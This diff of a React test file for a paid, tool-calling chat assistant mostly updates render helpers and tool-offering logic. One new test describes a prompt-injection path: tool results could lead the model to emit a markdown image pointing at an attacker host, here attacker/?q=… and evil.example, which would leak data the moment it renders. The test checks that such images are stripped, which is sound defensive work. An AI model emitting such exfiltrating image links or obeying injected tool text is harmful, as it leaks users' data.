@@ -9,13 +9,20 @@
 
 import React from "react";
 import { describe, it, expect, vi, beforeEach } from "vitest";
-import { render, screen, fireEvent, waitFor, within } from "@testing-library/react";
+import { screen, fireEvent, waitFor, within } from "@testing-library/react";
+import { renderWithQuery } from "./testUtils";
 
 const mockSendMessage = vi.fn();
 const mockConnectWallet = vi.fn();
 const mockSwitchIfNeeded = vi.fn();
 const mockSwitchImageIfNeeded = vi.fn();
 const mockGenerateImage = vi.fn();
+// vi.hoisted because the vi.mock factory below spreads these in immediately, rather than
+// behind an inner closure like the hook mocks do — a plain const is still uninitialised then.
+const { mockFetchSitzungen, mockFetchClaims } = vi.hoisted(() => ({
+  mockFetchSitzungen: vi.fn(),
+  mockFetchClaims: vi.fn(),
+}));
 
 vi.mock("../hooks/useX402Chat", () => ({
   useX402Chat: vi.fn(() => ({
@@ -78,11 +85,20 @@ vi.mock("../components/AgentInfoPanel", () => ({
   AgentInfoPanel: () => null,
 }));
 
+// Only the two fetchers are stubbed; the real selectors run against the Step 1 fixtures, so
+// these tests cover the wiring *and* the actual projection rather than a hand-written stand-in.
+vi.mock("../tools/bundestakt", async (importOriginal) => {
+  const actual = await importOriginal<typeof import("../tools/bundestakt")>();
+  return { ...actual, fetchSitzungen: mockFetchSitzungen, fetchClaims: mockFetchClaims };
+});
+
 import { AssistantChat } from "../components/AssistantChat";
 import { precheckLlmV1Agent } from "../hooks/x402Discovery";
 import { useX402Chat } from "../hooks/useX402Chat";
 import { useWalletConnection } from "../hooks/useWalletConnection";
 import { useAutoNetwork } from "../hooks/useAutoNetwork";
+import sitzungenFixture from "./fixtures/bundestakt/sitzungen.json";
+import claimsFixture from "./fixtures/bundestakt/claims.json";
 
 /** A tool-call turn, as sc_llm_x402 returns it: content: null, finish_reason: "tool_calls". */
 function toolCallResponse(name: string, args: Record<string, unknown>) {
@@ -114,6 +130,8 @@ describe("AssistantChat", () => {
     vi.clearAllMocks();
     mockSwitchIfNeeded.mockResolvedValue(true);
     mockSwitchImageIfNeeded.mockResolvedValue(true);
+    mockFetchSitzungen.mockResolvedValue(sitzungenFixture);
+    mockFetchClaims.mockResolvedValue(claimsFixture);
     mockSendMessage.mockResolvedValue({
       choices: [{ message: { role: "assistant", content: "Paris is the capital of France." } }],
     });
@@ -137,7 +155,7 @@ describe("AssistantChat", () => {
   });
 
   it("sends the full conversation as the prompt, including the system prompt", async () => {
-    render(<AssistantChat />);
+    renderWithQuery(<AssistantChat />);
 
     sendUserMessage("What is the capital of France?");
 
@@ -149,7 +167,7 @@ describe("AssistantChat", () => {
   });
 
   it("renders the assistant's reply as a message bubble", async () => {
-    render(<AssistantChat />);
+    renderWithQuery(<AssistantChat />);
 
     sendUserMessage("What is the capital of France?");
 
@@ -163,7 +181,7 @@ describe("AssistantChat", () => {
     // completion. `??` alone doesn't catch it, and used to render a literally blank bubble.
     mockSendMessage.mockResolvedValueOnce(textResponse(""));
 
-    render(<AssistantChat />);
+    renderWithQuery(<AssistantChat />);
     sendUserMessage("Draw a dog playing piano");
 
     await waitFor(() => {
@@ -185,7 +203,7 @@ describe("AssistantChat", () => {
     });
     mockSendMessage.mockImplementation(() => new Promise(() => {})); // never resolves: stay loading
 
-    render(<AssistantChat />);
+    renderWithQuery(<AssistantChat />);
     sendUserMessage("Hi");
 
     await waitFor(() => {
@@ -195,7 +213,7 @@ describe("AssistantChat", () => {
   });
 
   it("switches the network before paying", async () => {
-    render(<AssistantChat />);
+    renderWithQuery(<AssistantChat />);
 
     sendUserMessage("Hi");
 
@@ -216,7 +234,7 @@ describe("AssistantChat", () => {
           },
     );
 
-    render(<AssistantChat />);
+    renderWithQuery(<AssistantChat />);
 
     sendUserMessage("Hi");
 
@@ -234,7 +252,7 @@ describe("AssistantChat", () => {
       connectWallet: mockConnectWallet,
     });
 
-    render(<AssistantChat />);
+    renderWithQuery(<AssistantChat />);
 
     fireEvent.change(screen.getByPlaceholderText("assistent.placeholder"), { target: { value: "Hi" } });
     fireEvent.click(screen.getByRole("button", { name: /connectWalletMessage/ }));
@@ -254,16 +272,35 @@ describe("AssistantChat", () => {
       paymentNetwork: "eip155:8453",
     });
 
-    render(<AssistantChat />);
+    renderWithQuery(<AssistantChat />);
 
     const link = screen.getByRole("link", { name: /assistent\.viewPayment/ });
     expect(link).toHaveAttribute("href", "https://basescan.org/tx/0xdeposit");
   });
 
   it("does not render a payment receipt link before any payment has settled", () => {
-    render(<AssistantChat />);
+    renderWithQuery(<AssistantChat />);
 
     expect(screen.queryByRole("link", { name: /assistent\.viewPayment/ })).not.toBeInTheDocument();
+  });
+
+  it("drops markdown images from the assistant's reply, but keeps links", async () => {
+    // Untrusted third-party text reaches the model through the Bundestakt tool results, which
+    // run with no confirmation step, and the system prompt asks the model to echo their urls. A
+    // markdown image fetches itself the moment it renders, so an injected
+    // `![](https://attacker/?q=…)` would exfiltrate on sight; a link needs a click. See the
+    // comment at the ReactMarkdown call site in AssistantChat.tsx.
+    mockSendMessage.mockResolvedValueOnce(
+      textResponse("Look: ![x](https://evil.example/p.png) and [a source](https://bundestakt.de/s)"),
+    );
+
+    const { container } = renderWithQuery(<AssistantChat />);
+    sendUserMessage("What happened in the Bundestag?");
+
+    await waitFor(() => {
+      expect(screen.getByRole("link", { name: "a source" })).toBeInTheDocument();
+    });
+    expect(container.querySelector("img")).toBeNull();
   });
 
   describe("tool-call loop", () => {
@@ -272,7 +309,7 @@ describe("AssistantChat", () => {
         toolCallResponse("generate_image", { prompt: "a red bicycle on a beach", size: "1024x1024" }),
       );
 
-      render(<AssistantChat />);
+      renderWithQuery(<AssistantChat />);
       sendUserMessage("Draw me a red bicycle on a beach");
 
       await waitFor(() => {
@@ -288,7 +325,7 @@ describe("AssistantChat", () => {
         .mockResolvedValueOnce(textResponse("Here is your image!"));
       mockGenerateImage.mockResolvedValue({ imageUrl: "https://example.com/generated.png" });
 
-      const { container } = render(<AssistantChat />);
+      const { container } = renderWithQuery(<AssistantChat />);
       sendUserMessage("Draw me something");
 
       const promptBox = await screen.findByDisplayValue("original prompt");
@@ -316,7 +353,7 @@ describe("AssistantChat", () => {
         .mockResolvedValueOnce(toolCallResponse("generate_image", { prompt: "a cat", size: "1024x1024" }))
         .mockResolvedValueOnce(textResponse("No problem, let me know if you change your mind."));
 
-      render(<AssistantChat />);
+      renderWithQuery(<AssistantChat />);
       sendUserMessage("Draw a cat");
 
       await screen.findByDisplayValue("a cat");
@@ -329,17 +366,18 @@ describe("AssistantChat", () => {
       expect(toolResult && (JSON.parse(toolResult.content) as { status: string }).status).toBe("user_declined");
     });
 
-    it("stops offering the tool after a failure so the model explains instead of retrying", async () => {
+    it("stops offering the failed tool, while leaving the others on offer", async () => {
       // A real conversation burned all three hops re-requesting an image that kept failing: three
       // wallet prompts, three paid attempts, and the generic no-response fallback because no hop
-      // ever produced text. Sending tool_choice: "none" after a failure forces the answer.
+      // ever produced text. Withdrawing just that tool is what forces the answer — and unlike the
+      // old tool_choice: "none", it leaves the free Bundestakt lookups usable in the same turn.
       const consoleError = vi.spyOn(console, "error").mockImplementation(() => {});
       mockSendMessage
         .mockResolvedValueOnce(toolCallResponse("generate_image", { prompt: "a cat", size: "1024x1024" }))
         .mockResolvedValueOnce(textResponse("That didn't work — your wallet is out of USDC."));
       mockGenerateImage.mockRejectedValue(new Error("Request failed: 402 - insufficient allowance"));
 
-      render(<AssistantChat />);
+      renderWithQuery(<AssistantChat />);
       sendUserMessage("Draw a cat");
 
       await screen.findByDisplayValue("a cat");
@@ -347,9 +385,14 @@ describe("AssistantChat", () => {
 
       await waitFor(() => expect(mockSendMessage).toHaveBeenCalledTimes(2));
 
-      // First hop offers the tool; the hop after the failure must not.
-      expect(mockSendMessage.mock.calls[0][1]).toMatchObject({ tool_choice: "auto" });
-      expect(mockSendMessage.mock.calls[1][1]).toMatchObject({ tool_choice: "none" });
+      // First hop offers all three tools; the hop after the failure drops generate_image only.
+      const offeredNames = (i: number) =>
+        ((mockSendMessage.mock.calls[i][1] as { tools: { function: { name: string } }[] }).tools ?? []).map(
+          (t) => t.function.name,
+        );
+      expect(offeredNames(0)).toContain("generate_image");
+      expect(offeredNames(1)).not.toContain("generate_image");
+      expect(offeredNames(1)).toEqual(expect.arrayContaining(["get_sitzungen", "search_claims"]));
       // One confirmation, one paid attempt — not one per hop.
       expect(mockGenerateImage).toHaveBeenCalledTimes(1);
 
@@ -360,17 +403,49 @@ describe("AssistantChat", () => {
       consoleError.mockRestore();
     });
 
+    it("keeps offering a tool after not_found, so the model can retry with a corrected slug", async () => {
+      // The system prompt tells the model to call get_sitzungen twice: once without a slug to
+      // list sessions, once with the chosen slug for details. A wrong slug on the second call is
+      // a normal, recoverable outcome — unlike a real failure, it must not withdraw the tool.
+      const goodSlug = (sitzungenFixture.sitzungen[0] as { slug: string }).slug;
+      mockSendMessage
+        .mockResolvedValueOnce(toolCallResponse("get_sitzungen", { slug: "not-a-real-slug" }))
+        .mockResolvedValueOnce(toolCallResponse("get_sitzungen", { slug: goodSlug }))
+        .mockResolvedValueOnce(textResponse("Here is what happened in that session."));
+
+      renderWithQuery(<AssistantChat />);
+      sendUserMessage("Tell me about that session");
+
+      await waitFor(() => expect(mockSendMessage).toHaveBeenCalledTimes(3));
+
+      // The bad slug came back not_found (asserted via the tool result below), yet hop 2 still
+      // offers get_sitzungen — that is the fix.
+      const offeredNames = (i: number) =>
+        ((mockSendMessage.mock.calls[i][1] as { tools?: { function: { name: string } }[] }).tools ?? []).map(
+          (t) => t.function.name,
+        );
+      expect(offeredNames(1)).toContain("get_sitzungen");
+
+      const firstConvo = mockSendMessage.mock.calls[1][0] as { role: string; content: string }[];
+      const firstToolResult = firstConvo.find((m) => m.role === "tool");
+      expect(JSON.parse(firstToolResult!.content)).toEqual({ status: "not_found" });
+
+      await waitFor(() => {
+        expect(screen.getByText("Here is what happened in that session.")).toBeInTheDocument();
+      });
+    });
+
     it("stops after MAX_HOPS and captions the image it did generate", async () => {
       // The model never produced a closing sentence, but the user approved and paid for the
       // images and they are on screen — so the bubble must not read "No response received".
       mockSendMessage.mockResolvedValue(toolCallResponse("generate_image", { prompt: "x", size: "1024x1024" }));
       mockGenerateImage.mockResolvedValue({ imageUrl: "https://example.com/x.png" });
 
-      render(<AssistantChat />);
+      renderWithQuery(<AssistantChat />);
       sendUserMessage("Draw x");
 
       // Auto-confirm every card the loop opens, until it gives up.
-      for (let i = 0; i < 3; i++) {
+      for (let i = 0; i < 4; i++) {
         const generateButton = await screen.findByRole("button", { name: /assistent\.toolConfirmGenerate/ });
         fireEvent.click(generateButton);
         await waitFor(() => expect(mockGenerateImage).toHaveBeenCalledTimes(i + 1));
@@ -380,20 +455,20 @@ describe("AssistantChat", () => {
         expect(screen.getByText("assistent.imageReady")).toBeInTheDocument();
       });
       expect(screen.queryByText("assistent.noResponse")).not.toBeInTheDocument();
-      expect(mockSendMessage).toHaveBeenCalledTimes(3); // MAX_HOPS, no 4th attempt
-      expect(mockGenerateImage).toHaveBeenCalledTimes(3);
+      expect(mockSendMessage).toHaveBeenCalledTimes(4); // MAX_HOPS, no 5th attempt
+      expect(mockGenerateImage).toHaveBeenCalledTimes(4);
     });
 
     it("still says no-response when the hops run out without an image", async () => {
-      // The other side of the caption branch. tool_choice: "none" after the first decline is a
-      // request, not a guarantee — an upstream that keeps asking anyway burns every hop, and with
+      // The other side of the caption branch. Withdrawing a tool after the first decline stops us
+      // offering it, but an upstream that keeps asking for it anyway burns every hop — and with
       // nothing generated there is nothing to caption.
       mockSendMessage.mockResolvedValue(toolCallResponse("generate_image", { prompt: "x", size: "1024x1024" }));
 
-      render(<AssistantChat />);
+      renderWithQuery(<AssistantChat />);
       sendUserMessage("Draw x");
 
-      for (let i = 0; i < 3; i++) {
+      for (let i = 0; i < 4; i++) {
         const cancelButton = await screen.findByRole("button", { name: "assistent.cancel" });
         fireEvent.click(cancelButton);
         await waitFor(() => expect(mockSendMessage).toHaveBeenCalledTimes(i + 1));
@@ -405,12 +480,149 @@ describe("AssistantChat", () => {
       expect(mockGenerateImage).not.toHaveBeenCalled();
     });
 
+    it("runs a Bundestakt lookup silently — no confirm card — and feeds the result back", async () => {
+      // Unlike generate_image, these are free and read-only, so gating them behind a wallet-style
+      // confirmation would be friction with nothing to protect.
+      mockSendMessage
+        .mockResolvedValueOnce(toolCallResponse("get_sitzungen", {}))
+        .mockResolvedValueOnce(textResponse("The last session was about the 2027 budget."));
+
+      renderWithQuery(<AssistantChat />);
+      sendUserMessage("What was the last Bundestag session about?");
+
+      await waitFor(() => expect(mockSendMessage).toHaveBeenCalledTimes(2));
+      expect(screen.queryByRole("button", { name: /assistent\.toolConfirmGenerate/ })).not.toBeInTheDocument();
+      expect(mockFetchSitzungen).toHaveBeenCalledTimes(1);
+
+      // The projected result reaches the model as a role: "tool" turn.
+      const secondConvo = mockSendMessage.mock.calls[1][0] as { role: string; content: string }[];
+      const toolResult = secondConvo.find((m) => m.role === "tool");
+      expect(toolResult).toBeDefined();
+      const parsed = JSON.parse(toolResult!.content) as { status: string; sitzungen: unknown[] };
+      expect(parsed.status).toBe("ok");
+      expect(parsed.sitzungen.length).toBeGreaterThan(0);
+    });
+
+    it("fetches each Bundestakt endpoint once per turn, even across hops", async () => {
+      // The intended flow calls /sitzungen twice — list, then the chosen slug. That dump is 71 KB
+      // (claims is 912 KB), so the per-turn cache is the difference between one download and two.
+      const slug = (sitzungenFixture.sitzungen[0] as { slug: string }).slug;
+      mockSendMessage
+        .mockResolvedValueOnce(toolCallResponse("get_sitzungen", {}))
+        .mockResolvedValueOnce(toolCallResponse("get_sitzungen", { slug }))
+        .mockResolvedValueOnce(textResponse("Here is what happened."));
+
+      renderWithQuery(<AssistantChat />);
+      sendUserMessage("Tell me about the last session in detail");
+
+      await waitFor(() => expect(mockSendMessage).toHaveBeenCalledTimes(3));
+      expect(mockFetchSitzungen).toHaveBeenCalledTimes(1);
+    });
+
+    it("keeps the image tool on offer when a Bundestakt lookup fails", async () => {
+      // The regression this guards: a single shared `toolFailed` flag would have disabled
+      // generate_image for the rest of the turn because an unrelated, free lookup failed.
+      mockFetchClaims.mockRejectedValue(new Error("Failed to fetch"));
+      mockSendMessage
+        .mockResolvedValueOnce(toolCallResponse("search_claims", { query: "rente" }))
+        .mockResolvedValueOnce(textResponse("I could not reach the fact-check database."));
+
+      renderWithQuery(<AssistantChat />);
+      sendUserMessage("Did anyone lie about pensions?");
+
+      await waitFor(() => expect(mockSendMessage).toHaveBeenCalledTimes(2));
+
+      const offered = (mockSendMessage.mock.calls[1][1] as { tools: { function: { name: string } }[] }).tools;
+      const names = offered.map((t) => t.function.name);
+      expect(names).toContain("generate_image");
+      expect(names).not.toContain("search_claims");
+    });
+
+    it("omits the tools key entirely once every tool has failed", async () => {
+      // `[]` is truthy and useX402Chat spreads `tools` in on truthiness, so an empty array would
+      // be sent as `tools: []`. "Nothing left to offer" has to mean the key is absent.
+      mockFetchSitzungen.mockRejectedValue(new Error("down"));
+      mockFetchClaims.mockRejectedValue(new Error("down"));
+
+      // All three in one hop: the two lookups fail on their own, the image tool via a cancel.
+      mockSendMessage.mockResolvedValue({
+        choices: [
+          {
+            message: {
+              role: "assistant",
+              content: null,
+              tool_calls: [
+                { id: "a", type: "function", function: { name: "get_sitzungen", arguments: "{}" } },
+                { id: "b", type: "function", function: { name: "search_claims", arguments: "{}" } },
+                { id: "c", type: "function", function: { name: "generate_image", arguments: "{}" } },
+              ],
+            },
+            finish_reason: "tool_calls",
+          },
+        ],
+      });
+
+      renderWithQuery(<AssistantChat />);
+      sendUserMessage("Everything is broken");
+
+      const cancelButton = await screen.findByRole("button", { name: "assistent.cancel" });
+      fireEvent.click(cancelButton);
+
+      await waitFor(() => expect(mockSendMessage.mock.calls.length).toBeGreaterThanOrEqual(2));
+
+      const secondCallOptions = mockSendMessage.mock.calls[1][1] as Record<string, unknown>;
+      expect(secondCallOptions.tools).toBeUndefined();
+      expect("tools" in secondCallOptions && secondCallOptions.tools !== undefined).toBe(false);
+    });
+
+    it("answers unknown_tool for a name the model invented, without crashing the turn", async () => {
+      mockSendMessage
+        .mockResolvedValueOnce(toolCallResponse("get_weather", { city: "Berlin" }))
+        .mockResolvedValueOnce(textResponse("I cannot check the weather."));
+
+      renderWithQuery(<AssistantChat />);
+      sendUserMessage("What's the weather?");
+
+      await waitFor(() => expect(mockSendMessage).toHaveBeenCalledTimes(2));
+      const secondConvo = mockSendMessage.mock.calls[1][0] as { role: string; content: string }[];
+      const toolResult = secondConvo.find((m) => m.role === "tool");
+      expect(JSON.parse(toolResult!.content)).toEqual({ status: "unknown_tool" });
+
+      await waitFor(() => expect(screen.getByText("I cannot check the weather.")).toBeInTheDocument());
+    });
+
+    it("credits Bundestakt after a successful lookup, but not after a failed one", async () => {
+      // CC BY 4.0 requires naming and linking the source, so this line is a licence obligation.
+      // It is equally an honesty requirement not to show it when nothing was actually retrieved.
+      mockSendMessage
+        .mockResolvedValueOnce(toolCallResponse("get_sitzungen", {}))
+        .mockResolvedValueOnce(textResponse("The budget was the main topic."));
+
+      const { unmount } = renderWithQuery(<AssistantChat />);
+      sendUserMessage("What happened?");
+      await waitFor(() => expect(screen.getByText("assistent.bundestaktSource")).toBeInTheDocument());
+      unmount();
+
+      vi.clearAllMocks();
+      mockSwitchIfNeeded.mockResolvedValue(true);
+      mockFetchSitzungen.mockRejectedValue(new Error("Failed to fetch"));
+      mockSendMessage
+        .mockResolvedValueOnce(toolCallResponse("get_sitzungen", {}))
+        .mockResolvedValueOnce(textResponse("I could not reach Bundestakt."));
+
+      renderWithQuery(<AssistantChat />);
+      sendUserMessage("What happened?");
+
+      await waitFor(() => expect(screen.getByText("I could not reach Bundestakt.")).toBeInTheDocument());
+      expect(screen.queryByText("assistent.bundestaktSource")).not.toBeInTheDocument();
+    });
+
     it("never offers the image tool a testnet network", async () => {
       // useAutoNetwork keeps the wallet's current chain whenever it is in the supported list, so
       // a testnet entry here would let a wallet left on Sepolia silently generate a placeholder
       // image against the testnet mock — while the chat, which is mainnet-only, had already
       // taken a real USDC deposit. The image tool has no visible network picker to catch it.
-      render(<AssistantChat />);
+      renderWithQuery(<AssistantChat />);
 
       const imageCall = vi
         .mocked(useAutoNetwork)
@@ -432,7 +644,7 @@ describe("AssistantChat", () => {
         .mockResolvedValueOnce(textResponse("Sorry, that did not work."));
       mockGenerateImage.mockRejectedValue(new Error("Request failed: 402 - insufficient allowance"));
 
-      render(<AssistantChat />);
+      renderWithQuery(<AssistantChat />);
       sendUserMessage("Draw a cat");
 
       await screen.findByDisplayValue("a cat");
@@ -459,7 +671,7 @@ describe("AssistantChat", () => {
         .mockResolvedValueOnce(textResponse("Sorry."));
       mockGenerateImage.mockRejectedValue(new Error("x".repeat(500)));
 
-      render(<AssistantChat />);
+      renderWithQuery(<AssistantChat />);
       sendUserMessage("Draw a cat");
 
       await screen.findByDisplayValue("a cat");
@@ -477,7 +689,7 @@ describe("AssistantChat", () => {
     it("disables the send button and input while the confirm card is open", async () => {
       mockSendMessage.mockResolvedValueOnce(toolCallResponse("generate_image", { prompt: "x", size: "1024x1024" }));
 
-      render(<AssistantChat />);
+      renderWithQuery(<AssistantChat />);
       sendUserMessage("Draw x");
 
       await screen.findByDisplayValue("x");
@@ -494,13 +706,13 @@ describe("AssistantChat", () => {
     beforeEach(() => window.localStorage.clear());
 
     it("defaults to Optimism and pays on it", () => {
-      render(<AssistantChat />);
+      renderWithQuery(<AssistantChat />);
 
       expect(useX402Chat).toHaveBeenCalledWith("eip155:10", "https://llm-agent.fretchen.eu");
     });
 
     it("persists the chosen network and pays on it", async () => {
-      render(<AssistantChat />);
+      renderWithQuery(<AssistantChat />);
 
       fireEvent.click(screen.getByRole("button", { name: "Base" }));
 
@@ -511,7 +723,7 @@ describe("AssistantChat", () => {
     it("restores a stored choice on the next visit", async () => {
       window.localStorage.setItem("x402-chat-network", "eip155:8453");
 
-      render(<AssistantChat />);
+      renderWithQuery(<AssistantChat />);
 
       await waitFor(() => expect(useX402Chat).toHaveBeenLastCalledWith("eip155:8453", "https://llm-agent.fretchen.eu"));
     });
@@ -519,7 +731,7 @@ describe("AssistantChat", () => {
     it("ignores a stored network the site no longer supports", async () => {
       window.localStorage.setItem("x402-chat-network", "eip155:84532");
 
-      render(<AssistantChat />);
+      renderWithQuery(<AssistantChat />);
 
       await waitFor(() => expect(useX402Chat).toHaveBeenLastCalledWith("eip155:10", "https://llm-agent.fretchen.eu"));
     });
@@ -537,7 +749,7 @@ describe("AssistantChat", () => {
         paymentNetwork: "eip155:8453",
       });
 
-      render(<AssistantChat />);
+      renderWithQuery(<AssistantChat />);
 
       // The note names the chain with a ChainBadge rather than bare text, so the string is
       // split across elements — assert the label and the badge separately.
@@ -569,7 +781,7 @@ describe("AssistantChat", () => {
     }
 
     it("renders the selector and pays the default agent until one is chosen", () => {
-      render(<AssistantChat />);
+      renderWithQuery(<AssistantChat />);
 
       expect(screen.getByPlaceholderText("https://another-agent.example")).toBeInTheDocument();
       expect(useX402Chat).toHaveBeenCalledWith("eip155:10", "https://llm-agent.fretchen.eu");
@@ -578,7 +790,7 @@ describe("AssistantChat", () => {
     it("pre-checks a pasted URL and then pays that agent instead", async () => {
       vi.mocked(precheckLlmV1Agent).mockResolvedValue({ ok: true, card: CUSTOM_CARD });
 
-      render(<AssistantChat />);
+      renderWithQuery(<AssistantChat />);
       pasteAndTry(CUSTOM_URL);
 
       await waitFor(() => expect(precheckLlmV1Agent).toHaveBeenCalledWith(CUSTOM_URL));
@@ -593,7 +805,7 @@ describe("AssistantChat", () => {
         reason: "Expected a 402 payment challenge, got 200.",
       });
 
-      render(<AssistantChat />);
+      renderWithQuery(<AssistantChat />);
       pasteAndTry("https://not-an-agent.example");
 
       expect(await screen.findByText(/Expected a 402 payment challenge/)).toBeInTheDocument();
@@ -603,7 +815,7 @@ describe("AssistantChat", () => {
     it("returns to the default agent", async () => {
       vi.mocked(precheckLlmV1Agent).mockResolvedValue({ ok: true, card: CUSTOM_CARD });
 
-      render(<AssistantChat />);
+      renderWithQuery(<AssistantChat />);
       pasteAndTry(CUSTOM_URL);
 
       const back = await screen.findByRole("button", { name: "Back to default agent" });
